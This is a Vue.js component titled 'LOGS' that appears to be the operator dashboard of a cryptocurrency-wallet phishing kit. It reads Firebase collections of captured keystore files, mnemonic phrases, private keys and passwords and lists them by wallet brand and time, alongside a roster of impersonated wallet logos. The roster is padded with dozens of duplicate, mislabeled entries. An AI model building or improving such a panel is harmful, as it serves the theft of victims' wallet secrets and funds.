<template>
<div>
<v-card color="basil">
    <v-card-title class="text-center justify-center py-6">
      <h1 class="font-weight-bold text-h2 basil--text">
        LOGS
      </h1>
    </v-card-title>

    <v-tabs
      v-model="tab"
      background-color="transparent"
      color="basil"
      grow
    >
      
      <v-tab
      >
        Keystore
      </v-tab>
      <v-tab
      >
        Mnemonics
      </v-tab>
      <v-tab
      >
        Private key
      </v-tab>
      <v-tab
      >
        Hardware
      </v-tab>
    </v-tabs>

    <v-tabs-items v-model="tab">
      <v-tab-item
      >
        <v-card
          color="basil"
          flat
        >
          <v-simple-table>
    <template v-slot:default>
      <thead>
        <tr>
          <th class="text-left">
            Wallet
          </th>
          <th class="text-left">
            Keystore file
          </th>
          <th class="text-left">
            Password
          </th>
           <th class="text-left">
           time
          </th>
        </tr>
      </thead>
      <tbody>
        <tr
          v-for="item in key_logs"
          :key="item.phrase"
       
        >
          
          <td>{{ item.wallet_type }}</td>
           <td ><a :href="item.name"> {{ item.name }}</a></td>
           <td>{{ item.passowrd }}</td>
            <td>{{ item.time.toDate().toLocaleString('en-US')}}</td>
        
        </tr>
      </tbody>
    </template>
  </v-simple-table>
        </v-card>
      </v-tab-item>


      <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
          <v-simple-table>
    <template v-slot:default>
      <thead>
        <tr>
          <th class="text-left">
            Wallet
          </th>
          <th class="text-left">
           Mnemonics Phrase
          </th>
          <th class="text-left">
            Password
          </th>
           <th class="text-left">
           time
          </th>
        </tr>
      </thead>
      <tbody>
        <tr
          v-for="item in logs"
          :key="item.phrase"
        >
          
          <td>{{ item.wallet_type }}</td>
           <td>{{ item.phrase }}</td>
           <td>{{ item.password }}</td>
            <td>{{ item.time.toDate().toLocaleString('en-US')}}</td>
        
        </tr>
      </tbody>
    </template>
  </v-simple-table>
        </v-card>
      </v-tab-item>





<v-tab-item
        
      >
        <v-card
          color="basil"
          flat
        >
          <v-simple-table>
    <template v-slot:default>
      <thead>
        <tr>
          <th class="text-left">
            Wallet
          </th>
          <th class="text-left">
            Private key
          </th>
          <th class="text-left">
            Password
          </th>
           <th class="text-left">
           time
          </th>
        </tr>
      </thead>
      <tbody>
        <tr
          v-for="item in priv_logs"
          :key="item.phrase"
        >
          
          <td><v-avatar><v-img :src="loadicon"></v-img></v-avatar>{{ item.wallet_type }} </td>
           <td>{{ item.private_key }}</td>
           <td>{{ item.password }}</td>
            <td>{{ item.time.toDate().toLocaleString('en-US')}}</td>
        
        </tr>
      </tbody>
    </template>
  </v-simple-table>
        </v-card>
      </v-tab-item>


      <v-tab-item
        
      >
        <v-card
          color="basil"
          flat
        >
          <v-simple-table>
    <template v-slot:default>
      <thead>
        <tr>
          <th class="text-left">
            Wallet
          </th>
          <th class="text-left">
            Phrase
          </th>
          <th class="text-left">
            Password
          </th>
           <th class="text-left">
           time
          </th>
        </tr>
      </thead>
      <tbody>
        <tr
          v-for="item in logs"
          :key="item.phrase"
        >
          
          <td>{{ item.wallet_type }}</td>
           <td>{{ item.phrase }}</td>
           <td>{{ item.password }}</td>
            <td>{{ item.time.toDate().toLocaleString('en-US')}}</td>
        
        </tr>
      </tbody>
    </template>
  </v-simple-table>
        </v-card>
      </v-tab-item>
    </v-tabs-items>
  </v-card>



</div>
 
</template>


<script>
import fb from '@/fire'
  export default {
    data () {
      return {
        logs: [],
        imgurl:"",
        priv_logs:[],
        document_file:"",
        tab:false,
        key_logs:[],
        wallet:[
        {name:"Coinbase Wallet",image:require("../assets/coinbase-wallet.png")},
        {name:"MyEtherWallet",image:require("../assets/myetherwallet.jpg")},
        {name:"ZenGo",image:require("../assets/zengo.png")},
        {name:"Trust Wallet",image:require("../assets/trust-wallet.jpg")},
        {name:"StakedWallet.io",image:require("../assets/stakedwallet-io.jpg")},
        {name:"Theta",image:require("../assets/theta.png")},
        {name:"Exodus",image:require("../assets/exodus-exodus.jpg")},
        {name:"Electrum Wallet",image:require("../assets/electrum-wallet.jpg")},
        {name:"Jaxx",image:require("../assets/jaxx.png")},
        {name:"Metamask",image:require("../assets/metamask.png")},
        {name:"Trezor Wallet",image:require("../assets/trezor-wallet.jpg")},
        {name:"Ambire Wallet",image:require("../assets/ambire-wallet.svg")},
        {name:"Coinomi",image:require("../assets/coinomi.png")},
        {name:"Bitcoin Core Client",image:require("../assets/Bitcoin-Core-Client.png")},
        {name:"Luno",image:require("../assets/luno.jpg")},
        {name:"BitGo Cryptocurrency Wallet",image:require("../assets/bitgo-cryptocurrency-wallet.png")},
        {name:"Coin Payments Wallet",image:require("../assets/coinpayments-wallet.png")},
        {name:"Blockchain",image:require("../assets/blockchain-com.png")},
        {name:"Xapo",image:require("../assets/xapo-wallet.png")},
        {name:"Atomic Wallet",image:require("../assets/atomic-wallet.png")},
        {name:"SimpleHold",image:require("../assets/simplehold.svg")},
        {name:"Bread Wallet",image:require("../assets/bread-wallet.png")},
        {name:"Cardano",image:require("../assets/cardano.png")},
        {name:"Crypterium",image:require("../assets/crypterium.svg")},
        {name:"Mycelium",image:require("../assets/mycelium-wallet.png")},
        {name:"Bitso",image:require("../assets/bitso.png")},
        {name:"Coinjar",image:require("../assets/coinjar-wallet.png")},
        {name:"CounterWallet",image:require("../assets/counterwallet.png")},
        {name:"Cryptyx Wallet",image:require("../assets/cryptx-wallet.png")},
        {name:"Omni Wallet",image:require("../assets/omniwallet.png")},
        {name:"Airbitz Bitcoin Wallet",image:require("../assets/airbitz-bitcoin-wallet.png")},
        {name:"Copay",image:require("../assets/copay.jpg")},
        {name:"Daedalus",image:require("../assets/daedalus.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        {name:"MyEtherWallet",image:require("../assets/zengo.png")},
        
      ],
      
      }
    },
computed: {
  loadicon(){
    return this.wallet.filter((e)=>{
  return (e.name=="Trust Wallet")
    })[0].image
  },
  
},
    mounted() {
      
  const loadkeystore = async ()=>{ 
      await fb.fb.collection('keystore_vali').onSnapshot((e)=>{
        console.log(e);
        e.docChanges().forEach(change => {
         if (change.type === 'added') {
        this.key_logs.push({...change.doc.data()})
        
      }
        })    
  
  })
  }
  loadkeystore();
 


  const loadmnemonics = async ()=>{ 
      await fb.fb.collection('mnemonics_vali').onSnapshot((e)=>{
        console.log(e);
        e.docChanges().forEach(change => {
         if (change.type === 'added') {
        this.logs.push({...change.doc.data()})
        
      }
        })    
  
  })
  }
  loadmnemonics();

  const loadprivatekey = async ()=>{ 
      await fb.fb.collection('private_key_vali').onSnapshot((e)=>{
        console.log(e);
        e.docChanges().forEach(change => {
         if (change.type === 'added') {
        this.priv_logs.push({...change.doc.data()})
        
      }
        })    
  
  })
  }
  loadprivatekey();

  
   
  },
 
  
  }
</script>


<style scoped>

</style>